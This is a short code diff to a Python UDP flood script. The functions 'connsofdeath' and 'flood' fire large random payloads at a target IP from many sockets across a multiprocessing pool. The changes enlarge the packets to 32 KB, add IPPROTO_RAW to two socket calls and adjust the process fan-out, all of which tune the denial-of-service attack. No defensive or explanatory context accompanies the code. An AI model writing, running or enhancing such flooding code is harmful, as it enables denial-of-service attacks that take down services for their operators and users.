@@ -9,12 +9,12 @@ def usage():
 
 def connsofdeath(ip):
     timeout = time.time() + 4
-    bytesU = random._urandom(1024)
+    bytesU = random._urandom(1024*32)
 
     conn1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    conn2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    conn2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, IPPROTO_RAW)
     conn3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    conn4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    conn4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, IPPROTO_RAW)
 
     r1 = random.randint(1, 1024)
     r2 = random.randint(1, 1024)
@@ -33,7 +33,7 @@ def flood(ip, duration):
     
     while time.time() < timer:
         with multiprocessing.Pool(cpuCount) as p:
-            p.map(connsofdeath, [ip]*(cpuCount*8*8))
+            p.map(connsofdeath, [ip]*(cpuCount*32))
     
     print('ran for a duration of '+str(duration)+' seconds.')
 
